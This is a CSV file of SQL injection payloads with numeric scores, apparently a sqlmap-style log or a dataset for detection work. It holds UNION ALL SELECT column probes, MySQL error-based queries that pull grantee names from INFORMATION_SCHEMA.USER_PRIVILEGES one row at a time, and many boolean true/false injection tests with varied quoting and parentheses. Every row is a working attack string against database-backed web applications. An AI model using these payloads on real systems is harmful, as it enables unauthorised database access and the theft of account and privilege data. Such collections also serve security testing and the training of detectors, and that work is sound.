payload,score
"[""-6883' UNION ALL SELECT 3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3374,3""]",4174
"[""-4028' UNION ALL SELECT 7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7427,7""]",4174
"[""-4063' UNION ALL SELECT 3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3762,3""]",4174
"[""-4937' UNION ALL SELECT 5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5377,5""]",4174
"[""-3283' UNION ALL SELECT 9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9814,9""]",4174
"[""-3143' UNION ALL SELECT 6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6455,6""]",4174
"[""-5747' UNION ALL SELECT 4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4661,4""]",4174
"[""-8609' UNION ALL SELECT 8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8744,8""]",4174
"[""1' AND (SELECT 8756 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT (CASE WHEN (2336=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                2336) THEN 1 ELSE 0 END)),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IsiY""]",4273
"[""1' AND (SELECT 9373 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT REPEAT(0x34,1024)),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- GUuT""]",4291
"[""1' AND (SELECT 7956 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT REPEAT(0x32,512)),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Dwlx""]",4291
"[""1' AND (SELECT 5657 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT REPEAT(0x36,256)),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- NdIU""]",4221
"[""1' AND (SELECT 5875 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT REPEAT(0x34,54)),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- RjIk""]",4221
"[""1' AND (SELECT 8930 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT IFNULL(CAST(COUNT(grantee) AS CHAR),0x20) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- RRlq""]",4273
"[""1' AND (SELECT 4118 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- lBMm""]",4257
"[""1' AND (SELECT 3472 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- GTSF""]",309
"[""1' AND (SELECT 5934 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- naBf""]",309
"[""1' AND (SELECT 4243 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- cCAY""]",309
"[""1' AND (SELECT 2734 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 4,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- xazF""]",309
"[""1' AND (SELECT 7069 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 5,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- EuLX""]",309
"[""1' AND (SELECT 8742 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 6,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- CZKO""]",309
"[""1' AND (SELECT 9591 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 7,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- rhqY""]",309
"[""1' AND (SELECT 1269 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 8,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- lBfd""]",309
"[""1' AND (SELECT 6923 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 9,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- xJIV""]",309
"[""1' AND (SELECT 8186 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 10,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dwGw""]",310
"[""1' AND (SELECT 2484 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 11,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- RRkH""]",310
"[""1' AND (SELECT 5037 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 12,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- CoRq""]",310
"[""1' AND (SELECT 7226 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 13,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Xvan""]",310
"[""1' AND (SELECT 9872 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 14,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- DkYH""]",310
"[""1' AND (SELECT 7374 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 15,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- FbHi""]",310
"[""1' AND (SELECT 8256 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 16,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- hmGt""]",310
"[""1' AND (SELECT 1106 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 17,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Yxca""]",310
"[""1' AND (SELECT 3759 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 18,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- hXTP""]",310
"[""1' AND (SELECT 3051 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 19,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- CvfN""]",310
"[""1' AND (SELECT 3558 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 20,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VYqb""]",310
"[""1' AND (SELECT 3309 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 21,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BXbL""]",310
"[""1' AND (SELECT 9636 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 22,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- GplW""]",310
"[""1' AND (SELECT 3228 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 23,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- AUMb""]",310
"[""1' AND (SELECT 8771 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 24,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ZzyD""]",310
"[""1' AND (SELECT 7383 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 25,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- YpCW""]",310
"[""1' AND (SELECT 2149 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 26,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- lAvS""]",310
"[""1' AND (SELECT 1464 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 27,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- EtHC""]",310
"[""1' AND (SELECT 3402 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 28,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- lUWu""]",310
"[""1' AND (SELECT 7233 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 29,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- rQGn""]",310
"[""1' AND (SELECT 6128 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 30,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- olpK""]",310
"[""1' AND (SELECT 8174 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 31,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- MykC""]",310
"[""1' AND (SELECT 3271 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 32,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- smon""]",310
"[""1' AND (SELECT 8346 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 33,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IwQP""]",310
"[""1' AND (SELECT 5315 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 34,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- jHhM""]",310
"[""1' AND (SELECT 7504 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 35,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- qyfw""]",310
"[""1' AND (SELECT 4653 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 36,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Xqjm""]",310
"[""1' AND (SELECT 2667 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 37,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- YTTe""]",310
"[""1' AND (SELECT 4185 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 38,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- LsAT""]",310
"[""1' AND (SELECT 2464 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 39,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- FXsX""]",310
"[""1' AND (SELECT 7236 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 40,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- xcSp""]",310
"[""1' AND (SELECT 9998 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 41,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- jGPT""]",310
"[""1' AND (SELECT 3244 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 42,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- UUmS""]",310
"[""1' AND (SELECT 9650 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 43,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VlKH""]",310
"[""1' AND (SELECT 9606 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 44,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- muAY""]",310
"[""1' AND (SELECT 9319 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 45,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kEPc""]",310
"[""1' AND (SELECT 8393 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 46,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- jKgI""]",310
"[""1' AND (SELECT 3401 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 47,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- LIJD""]",310
"[""1' AND (SELECT 3943 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 48,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Rcya""]",310
"[""1' AND (SELECT 9364 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 49,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- usTe""]",310
"[""1' AND (SELECT 2558 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 50,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- QmzD""]",310
"[""1' AND (SELECT 5211 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 51,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- FguG""]",310
"[""1' AND (SELECT 2786 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 52,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- LtUz""]",310
"[""1' AND (SELECT 6703 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 53,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- vXse""]",310
"[""1' AND (SELECT 6752 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 54,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- oheb""]",310
"[""1' AND (SELECT 1702 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 55,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- CNvQ""]",310
"[""1' AND (SELECT 5281 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT MID((IFNULL(CAST(grantee AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 56,1),0x716a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- UAwt""]",310
['3920'],0
['1) AND 1220=8605 AND (3702=3702'],89
['1) AND 3418=3418 AND (8577=8577'],89
['1 AND 3092=9747'],73
['1 AND 3418=3418'],73
['1 AND 8791=5076-- aglh'],80
['1 AND 3418=3418-- TbCm'],80
"[""1' AND 3039=5671 AND 'SyQu'='SyQu""]",0
"[""1' AND 3418=3418 AND 'dUbe'='dUbe""]",91
"[""1' AND 6186=3662 AND 'HXjy'='HXjy""]",0
['(SELECT (CASE WHEN (1854=3016) THEN 1 ELSE (SELECT 3016 UNION SELECT 8108) END))'],0
['(SELECT (CASE WHEN (5539=5539) THEN 1 ELSE (SELECT 4575 UNION SELECT 4834) END))'],0
['1) AND 1163=5424#'],75
['1) AND 1577=1577#'],75
['1)) AND 5741=4175#'],76
['1)) AND 1577=1577#'],76
['1))) AND 9259=6715#'],77
['1))) AND 1577=1577#'],77
['1 AND 6133=1125#'],74
['1 AND 1577=1577#'],74
['1)) AS kpLD WHERE 9052=9052 AND 8531=8543#'],100
['1)) AS cYaO WHERE 9540=9540 AND 1577=1577#'],100
['1) AS Psfu WHERE 5544=5544 AND 9684=4539#'],99
['1) AS sEcf WHERE 5055=5055 AND 1577=1577#'],99
['1` WHERE 1240=1240 AND 8488=7314#'],91
['1` WHERE 4198=4198 AND 1577=1577#'],91
['1`) WHERE 3071=3071 AND 9939=3710#'],92
['1`) WHERE 3193=3193 AND 1577=1577#'],92
"[""1' AND 4841=4119#""]",0
"[""1' AND 1577=1577#""]",75
"[""1' AND 1751=9002#""]",0
"['1"" AND 7166=4215#']",75
"['1"" AND 1577=1577#']",75
"['1"") AND 4252=2288#']",76
"['1"") AND 1577=1577#']",76
"['1"")) AND 3723=1793#']",77
"['1"")) AND 1577=1577#']",77
"['1""))) AND 6681=3187#']",78
"['1""))) AND 1577=1577#']",78
"['1"")) AS wZaK WHERE 6463=6463 AND 5751=5778#']",101
"['1"")) AS yVvx WHERE 3036=3036 AND 1577=1577#']",101
"['1"") AS JUtC WHERE 2668=2668 AND 7920=3559#']",100
